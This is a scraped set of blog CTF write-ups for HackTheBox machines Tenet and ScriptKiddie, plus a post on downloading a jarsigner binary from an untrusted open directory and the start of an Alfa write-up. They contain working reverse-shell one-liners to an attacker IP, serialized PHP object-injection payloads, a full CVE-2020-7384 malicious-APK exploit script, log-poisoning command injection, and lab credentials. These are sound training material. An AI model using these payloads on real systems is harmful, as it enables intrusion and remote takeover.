«10.10.14.31» $ php tenetization.php O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D If I don\u0026rsquo;t have PHP. I could use this site to get output of my PHP script.\nI\u0026rsquo;ll send that output to sator.php via curl\n→ root@kali «exploits» «10.10.14.31» $ curl -sI \u0026#34;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D\u0026#34; HTTP/1.1 200 OK Date: Mon, 14 Jun 2021 12:43:43 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=UTF-8 And that works!\n Weaponize - Reverse Shell I\u0026rsquo;ll modify the file name and the data for reverse shell.\n\u0026lt;?php class DatabaseExport { public function __construct() { $this-\u0026gt;user_file = \u0026#39;iamf.php\u0026#39;; $this-\u0026gt;data = \u0026#34;\u0026lt;?php system(\\\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.31/443 0\u0026gt;\u0026amp;1\u0026#39; \\\u0026#34;) ?\u0026gt;\u0026#34;; } } $o = new DatabaseExport(); echo urlencode(serialize($o)); ?\u0026gt;I\u0026rsquo;ll use this script to send that and then wait on my listener\n#!/bin/bash  serial=`php tenetization.php` curl -s http://10.10.10.223/sator.php?arepo=$serial sleep 5; curl -s http://10.10.10.223/iamf.php When I run the exploit it hangs\n→ root@kali «exploits» «10.10.14.31» $ bash tenetization.sh [+] Grabbing users from text file \u0026lt;br\u0026gt; [] Database updated \u0026lt;br\u0026gt;[] Database updated \u0026lt;br\u0026gt; But after a few seconds, I\u0026rsquo;ve shell on my listener\n→ root@kali «~» «10.10.14.31» $ nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.223] 39174 bash: cannot set terminal process group (1545): Inappropriate ioctl for device bash: no job control in this shell www-data@tenet:/var/www/html$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@tenet:/var/www/html$  Privilege Escalation Shell as neil WP config I found neil\u0026rsquo;s credentials inside the wp-config.php.\nwww-data@tenet:/var/www/html/wordpress$ cat wp-config.php cat wp-config.php \u0026lt;?php ...\u0026lt;SNIP\u0026gt;... // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;neil\u0026#39; ); /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;Opera2112\u0026#39; ); SSH - Neil The credentials works on SSH (neil:Opera2112)\n→ root@kali «tenet» «10.10.14.31» $ ssh neil@10.10.10.223 neil@10.10.10.223\u0026#39;s password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64) ...\u0026lt;SNIP\u0026gt;... Last login: Mon Jun 14 12:57:27 2021 from 10.10.16.12 neil@tenet:~$ id uid=1001(neil) gid=1001(neil) groups=1001(neil) User\u0026rsquo;s flag is done here.\nneil@tenet:~$ ls -l total 4 -r-------- 1 neil neil 33 Jun 14 06:46 user.txt   Shell as root Sudo privileges User neil has sudo privileges on a custom script called enableSSH.sh.\nneil@tenet:~$ sudo -l Matching Defaults entries for neil on tenet: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\: User neil may run the following commands on tenet: (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh neil@tenet:~$ Analysis neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh -rwxr-xr-x 1 root root 1080 Dec 8 2020 /usr/local/bin/enableSSH.sh neil@tenet:~$ cat /usr/local/bin/enableSSH.sh #!/bin/bash checkAdded() { sshName=$(/bin/echo $key | /usr/bin/cut -d \u0026#34; \u0026#34; -f 3) if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then /bin/echo \u0026#34;Successfully added $sshNameto authorized_keys file!\u0026#34; else /bin/echo \u0026#34;Error in adding $sshNameto authorized_keys file!\u0026#34; fi } checkFile() { if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then /bin/echo \u0026#34;Error in creating key file!\u0026#34; if [[ -f $1 ]]; then /bin/rm $1; fi exit 1 fi } addKey() { tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) (umask 110; touch $tmpName) /bin/echo $key \u0026gt;\u0026gt;$tmpName checkFile $tmpName /bin/cat $tmpName \u0026gt;\u0026gt;/root/.ssh/authorized_keys /bin/rm $tmpName } key=\u0026#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\u0026#34; addKey checkAdded The value of $key above will be placed temporary at /tmp/SSH-randomfilename before it get added into the /root/.ssh/authorized_keys\nneil@tenet:~$ tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) neil@tenet:~$ echo $tmpName /tmp/ssh-4swbpcnN If the $key is available at /root/.ssh/authorized_keys, it\u0026rsquo;ll returns a success message, if it\u0026rsquo;s not, it\u0026rsquo;ll return an error message.\nif [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then /bin/echo \u0026#34;Successfully added $sshNameto authorized_keys file!\u0026#34; else /bin/echo \u0026#34;Error in adding $sshNameto authorized_keys file!\u0026#34; fi It\u0026rsquo;s a race condition.\nThe idea here is if I could overwrite the file contents of /tmp/ssh-randomfilename with my own public key then I should be able to log in as root using my private key.\nExploiting enableSSH.sh Just like how I did earlier on ScriptKiddie, I\u0026rsquo;ll also use while loop to keep inserting my public key at /tmp/ssh-*, but this time, I\u0026rsquo;ll use a binary called tee.\nFirst, I\u0026rsquo;ll put my public key at neil\u0026rsquo;s home directory.\nneil@tenet:~$ echo \u0026#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... root@iamf\u0026#39; \u0026gt; .iamf Then I\u0026rsquo;ll run this loop to make user neil keep doing sudo.\nneil@tenet:~$ while sleep 1; do sudo /usr/local/bin/enableSSH.sh; done; I\u0026rsquo;ll open another neil\u0026rsquo;s session and run this\nneil@tenet:~$ while sleep 0.1; do cat .iamf | tee /tmp/ssh-*;done When I see there is a \u0026ldquo;Error in adding root@ubuntu to authorized_keys file!\u0026rdquo; message, then I should be able to login as root.\nAfter some minutes, I can finally login as root.\n→ root@kali «tenet» «10.10.14.31» $ ssh root@10.10.10.223 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64) ...\u0026lt;SNIP\u0026gt;... Last login: Mon Jun 14 14:23:52 2021 from 10.10.16.12 root@tenet:~# id uid=0(root) gid=0(root) groups=0(root) root@tenet:~# ls -l total 4 -r-------- 1 root root 33 Jun 14 06:46 root.txt root@tenet:~#  Update: I found out that sometimes I can login as root even without seeing the error message. So I decided to use while loop for SSH login.\n→ root@kali «tenet» «10.10.14.31» $ while sleep 1; do ssh -oConnectTimeout=1s -oPasswordAuthentication=no root@10.10.10.223 2\u0026gt;/dev/null; done  References  https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-tenet/","summary":"Tenet is a medium difficulty Linux machine from Hack The Box. It features PHP deserialization vulnerability, which can be leveraged to gain a foothold. Enumerating the web configuration files finds a set of database credentials, and they are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.","tags":["Linux","WordPress","PHP","Deserialization","WPscan","sudo","ffuf","Password-reuse","Race-condition"],"title":"HackTheBox - Tenet"},{"content":"The PoC exploit of ScriptKiddie from HackTheBox actually requires a binary that is known as jarsigner . The binary itself is bundled with the Java SDK and my Kali Linux definitely has it, so I should have that binary installed.\nHowever, I was unable to locate this jarsigner on my machine.\nI started to look for it on the internet, simply because I didn\u0026rsquo;t want to reinstall the Java SDK on my machine just to get this single binary file, which could potentially mess up the current system/installed apps .\nMost of the search results that showed up was a documentation about how to use that binary.\nIn search of the missing binary - Google dork Fortunately, I discovered some sites that provided the single binary I needed using Google dorks.\nintitle:\u0026quot;index of /\u0026quot; bin jarsigner I end up on this site:\n I have the binary, but it can not be used with the exploit tool by simply putting the binary on my Java PATH.\nInstalling jarsigner It turns out that Java binary needs to be \u0026lsquo;symlinked\u0026rsquo;.\nSo, first, I\u0026rsquo;ll have to find out where is my Java binary located.\n$ ls -l $(which java) lrwxrwxrwx 1 root root 22 Nov 25 2019 /usr/bin/java -\u0026gt; /etc/alternatives/java $ ls -l /etc/alternatives/java lrwxrwxrwx 1 root root 43 Nov 25 2019 /etc/alternatives/java -\u0026gt; /usr/lib/jvm/java-11-openjdk-amd64/bin/java I\u0026rsquo;ll grab the jarsigner binary from the site and drop it directly under /usr/lib/jvm/java-11-openjdk-amd64/bin/\n$ curl -s http://www.citrucoop.es/jdk-11.0.6/bin/jarsigner \u0026gt; /usr/lib/jvm/java-11-openjdk-amd64/bin/jarsigner Then, I\u0026rsquo;ll make a symlink of jarsigner at /usr/bin/\n$ cd /usr/bin $ ln -sf /usr/lib/jvm/java-11-openjdk-amd64/bin/jarsigner jarsigner It\u0026rsquo;s working now fine.\nHold up.. isn\u0026rsquo;t it unsafe? 🤔\nAbsolutely! 😅 so don\u0026rsquo;t ever do this if you don\u0026rsquo;t trust the site.\n","permalink":"https://fahmifj.github.io/blog/install-jar-signer-without-java-sdk/","summary":"The PoC exploit of ScriptKiddie from HackTheBox actually requires a binary that is known as jarsigner . The binary itself is bundled with the Java SDK and my Kali Linux definitely has it, so I should have that binary installed.\nHowever, I was unable to locate this jarsigner on my machine.\nI started to look for it on the internet, simply because I didn\u0026rsquo;t want to reinstall the Java SDK on my machine just to get this single binary file, which could potentially mess up the current system/installed apps .","tags":["nanoblog","jarsigner","dorking"],"title":"Install jarsigner without Java SDK in Kali Linux"},{"content":"ScriptKiddie consists of two exploitations on Metasploit framework. The first exploit is classified as CVE-2020-7384, which allows me to gain a foothold by crafting a malicious APK that executes a reverse shell when used as APK template on msfvenom. There is a script which automatically runs a nmap scan against a host from a log file. The script can be exploited by poisoning the log with a reverse shell. Sudo privileges on msfconsole allows me to gain a root access.\nSkills Learned  Exploiting Metasploit CVE-2020-7384 Exploiting custom script  Tools  Nmap CVE-2020-7384 PoC  Reconnaissance Nmap Full port scan with nmap discovers two open ports: SSH on port 22, and UPnP on port 5000\n→ root@kali «scriptkiddie» «10.10.14.31» $ nmap -p- --min-rate 1000 --reason -oA nmap/10-tcp-allport 10.10.10.226 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-13 20:42 EDT Nmap scan report for 10.10.10.226 Host is up, received echo-reply ttl 63 (0.065s latency). Not shown: 65533 closed ports Reason: 65533 resets PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 5000/tcp open upnp syn-ack ttl 63 Nmap done: 1 IP address (1 host up) scanned in 45.79 seconds With default script scan, nmap identifies that port 5000 is actually a web application hosted using Python.\n→ root@kali «scriptkiddie» «10.10.14.31» $ nmap -p22,5000 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.226 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-13 20:44 EDT Nmap scan report for 10.10.10.226 Host is up (0.056s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5) |_http-server-header: Werkzeug/0.16.1 Python/3.8.5 |_http-title: k1d\u0026#39;5 h4ck3r t00l5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.66 second Enumeration TCP 5000 - Website The site provides several online hacking tools.\n The nmap tool can be used to scan against itself.\n The IP field doesn\u0026rsquo;t accept others inputs except IPv4, so I don\u0026rsquo;t thing it can be abused. But I\u0026rsquo;ll note the nmap version.\nThe next tool is msfvenom, it can be used to generate a binary for sending a reverse shell. It has three options on the OS: Windows, Linux and Android. There is also a template option, for example, you can embed your payload to Windows\u0026rsquo;s calc.exe.\n Somehow, it can only generates payload for Windows and Android.\n The payload is available at http://10.10.10.226:5000/static/payloads/[here] for 5 mins.\nThe last tool is searchsploit, I tried to stack the commands but it returns this message\n Tools vulnerability I can\u0026rsquo;t get the tools version except nmap.\nSo, I searched some exploits before the box release (February 2021) on Exploit-DB and here is what I found.\n And that is probably what I need.\nI typed \u0026ldquo;msfvenom\u0026rdquo; on the site too, and the exploit also appeared there.\n Foothold Shell as kid Mfvenom CVE-2020-7384 I\u0026rsquo;ll use this exploit, but I\u0026rsquo;ll change the payload and the template location to current working dir.\n#!/usr/bin/env python3 import subprocess import tempfile import os from base64 import b32encode # Change me payload = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.31/9000 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; # b32encode to avoid badchars (keytool is picky) # thanks to @fdellwing for noticing that base64 can sometimes break keytool # \u0026lt;https://github.com/justinsteven/advisories/issues/2\u0026gt; payload_b32 = b32encode(payload.encode()).decode() dname = f\u0026#34;CN=\u0026#39;|echo {payload_b32}| base32 -d | sh #\u0026#34; print(f\u0026#34;[+] Manufacturing evil apkfile\u0026#34;) print(f\u0026#34;Payload: {payload}\u0026#34;) print(f\u0026#34;-dname: {dname}\u0026#34;) print() tmpdir = \u0026#34;./\u0026#34; apk_file = os.path.join(tmpdir, \u0026#34;evil.apk\u0026#34;) empty_file = os.path.join(tmpdir, \u0026#34;empty\u0026#34;) keystore_file = os.path.join(tmpdir, \u0026#34;signing.keystore\u0026#34;) storepass = keypass = \u0026#34;password\u0026#34; key_alias = \u0026#34;signing.key\u0026#34; open(empty_file, \u0026#34;w\u0026#34;).close() subprocess.check_call([\u0026#34;zip\u0026#34;, \u0026#34;-j\u0026#34;, apk_file, empty_file]) subprocess.check_call([\u0026#34;keytool\u0026#34;, \u0026#34;-genkey\u0026#34;, \u0026#34;-keystore\u0026#34;, keystore_file, \u0026#34;-alias\u0026#34;, key_alias, \u0026#34;-storepass\u0026#34;, storepass, \u0026#34;-keypass\u0026#34;, keypass, \u0026#34;-keyalg\u0026#34;, \u0026#34;RSA\u0026#34;, \u0026#34;-keysize\u0026#34;, \u0026#34;2048\u0026#34;, \u0026#34;-dname\u0026#34;, dname]) subprocess.check_call([\u0026#34;jarsigner\u0026#34;, \u0026#34;-sigalg\u0026#34;, \u0026#34;SHA1withRSA\u0026#34;, \u0026#34;-digestalg\u0026#34;, \u0026#34;SHA1\u0026#34;, \u0026#34;-keystore\u0026#34;, keystore_file, \u0026#34;-storepass\u0026#34;, storepass, \u0026#34;-keypass\u0026#34;, keypass, apk_file, key_alias]) print() print(f\u0026#34;[+] Done! apkfile is at {apk_file}\u0026#34;) print(f\u0026#34;Do: msfvenom -x {apk_file}-p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null\u0026#34;) It produces evil.apk in my current work dir. It also shows the exploit commands.\n→ root@kali «exploits» «10.10.14.31» $ python3 exploit_msfvenom.py [+] Manufacturing evil apkfile Payload: bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.31/9000 0\u0026gt;\u0026amp;1\u0026#34; -dname: CN=\u0026#39;|echo MJQXG2BAFVRSAITCMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRGAXDCMBOGE2C4MZRF44TAMBQEAYD4JRREI====== | base32 -d | sh # adding: empty (stored 0%) jar signed. Warning: The signer\u0026#39;s certificate is self-signed. [+] Done! apkfile is at ./evil.apk Do: msfvenom -x ./evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null Reverse Shell - kid I\u0026rsquo;ll setup a nc listener on port 9000, then I\u0026rsquo;ll upload the evil.apk file as the template file and then I\u0026rsquo;ll click on the generate button.\n On my listener, I\u0026rsquo;ve a shell now as user kid.\nroot@kali «exploits» «10.10.14.31» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.226] 34230 bash: cannot set terminal process group (897): Inappropriate ioctl for device bash: no job control in this shell kid@scriptkiddie:~/html$  Shell upgrade I\u0026rsquo;ll upgrade my shell first.\n→ root@kali «exploits» «10.10.14.31» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.226] 34230 bash: cannot set terminal process group (897): Inappropriate ioctl for device bash: no job control in this shell kid@scriptkiddie:~/html$ id uid=1000(kid) gid=1000(kid) groups=1000(kid) kid@scriptkiddie:~/html$ export TERM=xterm export TERM=xterm kid@scriptkiddie:~/html$ which python which python kid@scriptkiddie:~/html$ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; kid@scriptkiddie:~/html$ ^Z [1] + 10652 suspended nc -nvlp 9000 → root@kali «exploits» «10.10.14.31» $ stty raw -echo; fg [1] + 10652 continued nc -nvlp 9000 kid@scriptkiddie:~/html$ User flag is done here.\nkid@scriptkiddie:~/html$ cd ~ kid@scriptkiddie:~$ ls -la total 60 ...\u0026lt;SNIP\u0026gt;... -rw-r--r-- 1 kid kid 807 Feb 25 2020 .profile drwx------ 2 kid kid 4096 Feb 10 16:11 .ssh -rw-r--r-- 1 kid kid 0 Jan 5 11:10 .sudo_as_admin_successful drwxrwxr-x 5 kid kid 4096 Feb 3 11:03 html drwxrwxrwx 2 kid kid 4096 Feb 3 07:40 logs drwxr-xr-x 3 kid kid 4096 Feb 3 11:48 snap -r-------- 1 kid kid 33 Jun 12 11:35 user.txt Privilege Escalation Shell as pwn Internal Enumeration On kid\u0026rsquo;s home, there\u0026rsquo;s a folder called logs. The logs folder contains one file called hackers, but it\u0026rsquo;s empty.\nkid@scriptkiddie:~/logs$ ls -la total 8 drwxrwxrwx 2 kid kid 4096 Feb 3 07:40 . drwxr-xr-x 11 kid kid 4096 Feb 3 11:49 .. -rw-rw-r-- 1 kid pwn 0 Jun 14 01:40 hackers I did a quick check on the available users who have shells, and it looks like I need to escalate to pwn.\nkid@scriptkiddie:~$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash kid:x:1000:1000:kid:/home/kid:/bin/bash pwn:x:1001:1001::/home/pwn:/bin/bash kid@scriptkiddie:~$ ls /home kid pwn Searching files owned by user pwn discovers one script called scanlosers.sh.\nkid@scriptkiddie:~$ find / -type f -user pwn 2\u0026gt;/dev/null /home/pwn/.bash_logout /home/pwn/.selected_editor /home/pwn/.bashrc /home/pwn/.profile /home/pwn/scanlosers.sh kid@scriptkiddie:~$ ls -l /home/pwn/scanlosers.sh -rwxrwxr-- 1 pwn pwn 250 Jan 28 17:57 /home/pwn/scanlosers.sh Script analysis The script is most likely linked with kid\u0026rsquo;s hack tools website and probably can be abused with stacked command, but I need to find how the log in hackers file is formatted.\nkid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh #!/bin/bash # \u0026lt;== Define log log=/home/kid/logs/hackers cd /home/pwn/ cat $log | cut -d\u0026#39; \u0026#39; -f3- | sort -u | while read ip; do sh -c \u0026#34;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip}2\u0026gt;\u0026amp;1 \u0026gt;/dev/null\u0026#34; \u0026amp; done # \u0026lt;== The log is cleared immediately if [[ $(wc -l \u0026lt; $log) -gt 0 ]]; then echo -n \u0026gt; $log; fi Looking back into the web source code, I find how the log format in searchsploit function and it is triggered by malicious input on the previous kid\u0026rsquo;s hack tools.\n...\u0026lt;SNIP\u0026gt;... def searchsploit(text, srcip): if regex_alphanum.match(text): result = subprocess.check_output([\u0026#39;searchsploit\u0026#39;, \u0026#39;--color\u0026#39;, text]) return render_template(\u0026#39;index.html\u0026#39;, searchsploit=result.decode(\u0026#39;UTF-8\u0026#39;, \u0026#39;ignore\u0026#39;)) else: with open(\u0026#39;/home/kid/logs/hackers\u0026#39;, \u0026#39;a\u0026#39;) as f: f.write(f\u0026#39;[{datetime.datetime.now()}] {srcip}\\n\u0026#39;) return render_template(\u0026#39;index.html\u0026#39;, sserror=\u0026#34;stop hacking me - well hack you back\u0026#34;) ...\u0026lt;SNIP\u0026gt;... I can trigger an event that logs my IP in the hackers file but then the logs is cleared so fast that I couldn\u0026rsquo;t catch it with the watch command.\n But with this, I could guess that this script is intended as a \u0026lsquo;counter attack\u0026rsquo;.\nFrom here, I know that scanlosers.sh is executed automatically after a malicious attempt is performed on the site.\nExploiting scanlosers.sh I lost the first format, so I\u0026rsquo;ll just recreate the same log but this one points to 127.0.0.1.\n→ root@kali «exploits» «10.10.14.31» $ python3 -c \u0026#34;from datetime import datetime; print(f\u0026#39;[{datetime.now()}] 127.0.0.1\u0026#39;)\u0026#34; [2021-06-14 00:43:54.924946] 127.0.0.1 To exploit the script, I have to trick this line from scanlosers.sh\necho $log | cut -d\u0026#39; \u0026#39; -f3- | sort -u What that line does is it extracts the IP address.\n→ root@kali «exploits» «10.10.14.31» $ log=\u0026#39;[2021-06-14 00:28:09.560444] 127.0.0.1\u0026#39; → root@kali «exploits» «10.10.14.31» $ echo $log | cut -d\u0026#39; \u0026#39; -f3- | sort -u 127.0.0.1 From here, I\u0026rsquo;ll just add a semi-colon and a space before putting my reverse shell.\n[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.30/9000 0\u0026gt;\u0026amp;1\u0026#39;; It becomes a stacked command.\n→ root@kali «exploits» «10.10.14.31» $ echo \u0026#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.30/9000 0\u0026gt;\u0026amp;1\u0026#39;;\u0026#34; | cut -d\u0026#39; \u0026#39; -f3- | sort -u 127.0.0.1; bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.30/9000 0\u0026gt;\u0026amp;1\u0026#39;; If I map that format to this line:\nsh -c \u0026quot;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null\u0026quot; It turns into this:\nsh -c \u0026#34;nmap --top-ports 10 -oN recon/127.0.0.1; bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.30/9000 0\u0026gt;\u0026amp;1\u0026#39;;.nmap 127.0.0.1; bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.30/9000 0\u0026gt;\u0026amp;1\u0026#39;; 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null\u0026#34; Since the logs is cleared automatically, I\u0026rsquo;ll use while loop to keep inserting my malicious log to the hackers file and setup my listener on port 9001.\nkid@scriptkiddie:~/logs$ while sleep 0.1; do echo \u0026#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.31/9001 0\u0026gt;\u0026amp;1\u0026#39;;\u0026#34; \u0026gt; hackers; done On my listener:\n→ root@kali «scriptkiddie» «10.10.14.31» $ nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.226] 33110 bash: cannot set terminal process group (868): Inappropriate ioctl for device bash: no job control in this shell pwn@scriptkiddie:~$ id id uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)  Shell as root Sudo - msfconsole User pwn has sudo privileges on msfconsole.\npwn@scriptkiddie:~$ sudo -l sudo -l Matching Defaults entries for pwn on scriptkiddie: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User pwn may run the following commands on scriptkiddie: (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole To exploit this I could just send a reverse shell with -x options on run and then I\u0026rsquo;ll wait on my nc listener.\npwn@scriptkiddie:~$ sudo msfconsole -q -x \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.31/9005 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; And I\u0026rsquo;m rooted\n→ root@kali «scriptkiddie» «10.10.14.31» $ rlwrap nc -nvlp 9005 listening on [any] 9005 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.226] 43512 bash: cannot set terminal process group (868): Inappropriate ioctl for device bash: no job control in this shell root@scriptkiddie:/home/pwn# id id uid=0(root) gid=0(root) groups=0(root) root@scriptkiddie:/home/pwn# cut -c-15 /root/root.txt cut -c-15 /root/root.txt bf7edd4c58e4420  References  https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/ https://discuss.getsol.us/d/4656-java-command-unknown-after-update/3 http://www.citrucoop.es/jdk-11.0.6/bin/  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/","summary":"ScriptKiddie consists of two exploitations on Metasploit framework. The first exploit is classified as CVE-2020-7384, which allows me to gain a foothold by crafting a malicious APK that executes a reverse shell when used as APK template on msfvenom. There is a script which automatically runs a nmap scan against a host from a log file. The script can be exploited by poisoning the log with a reverse shell. Sudo privileges on msfconsole allows me to gain a root access.","tags":["Linux","Metasploit","CVE-2020-7384","Sudo","Metasploit","Msfvenom"],"title":"HackTheBox - ScriptKiddie"},{"content":"Alfa starts with enumeration on FTP to obtain a username and an image file, and the image file is named after the user\u0026rsquo;s pet. Alfa\u0026rsquo;s website has a robots.txt file which contains an obfuscated web path to intranet chat support. The chat conversation reveals sensitive information, and with this, I\u0026rsquo;m able to guess the user\u0026rsquo;s password and gain a foothold on the system. In the user\u0026rsquo;s home directory, there is a VNC password and it can be used to log into the currently running VNC server as root.\nSkills Learned  Generating password list Brute-force FTP and SSH VNC password decrypt Port forwarding  Tools  Nmap Hydra Crackmapexec FTP client Gobuster Brainfuck decoder - https://www.dcode.fr/brainfuck-language VNCviewer pspy  Reconnaissance Nmap An initial scan with nmap discovers four open ports: FTP on port 21, HTTP on port 80, SMB on port 139 and 445.\n→ root@iamf «alfa» «192.168.2.103» $ nmap -sC -sV -oA nmap/10-initial-alfa 192.168.2.109 -v # Nmap 7.80 scan initiated Thu Apr 22 02:41:12 2021 as: nmap -sC -sV -oA nmap/10-initial-alfa -v 192.168.2.109 Nmap scan report for 192.168.2.109 Host is up (0.00056s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxr-xr-x 2 0 0 4096 Dec 17 13:02 thomas | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.2.103 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 80/tcp open http Apache httpd 2.4.38 ((Debian)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Alfa IT Solutions 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) MAC Address: 08:00:27:9C:8A:46 (Oracle VirtualBox virtual NIC) Service Info: Host: ALFA; OS: Unix Host script results: |_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -2s | nbstat: NetBIOS name: ALFA, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | Names: | ALFA\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | ALFA\u0026lt;03\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | ALFA\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | \\x01\\x02__MSBROWSE__\\x02\u0026lt;01\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1d\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; |_ WORKGROUP\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | smb-os-discovery: | OS: Windows 6.1 (Samba 4.9.5-Debian) | 